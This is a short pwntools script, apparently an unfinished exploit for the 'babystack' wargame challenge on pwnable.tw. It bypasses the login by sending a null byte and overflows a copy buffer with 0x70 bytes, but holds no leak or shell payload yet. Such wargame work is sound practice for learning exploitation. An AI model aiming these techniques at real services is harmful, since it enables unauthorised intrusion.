#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./babystack")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./babystack")
    libc = elf.libc

else:
    io = remote("chall.pwnable.tw", 10205)
    libc = ELF("./libc_64.so.6")

def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Login():
    io.sendlineafter(">> ", "1")
    io.sendlineafter(" :", '\0')

def magicCopy(buf):
    io.sendlineafter(">> ", "3")
    io.sendafter(" :", buf)

if __name__ == "__main__":
    DEBUG()
    Login()
    magicCopy("0" * 0x70)
    
    io.interactive()
    io.close()



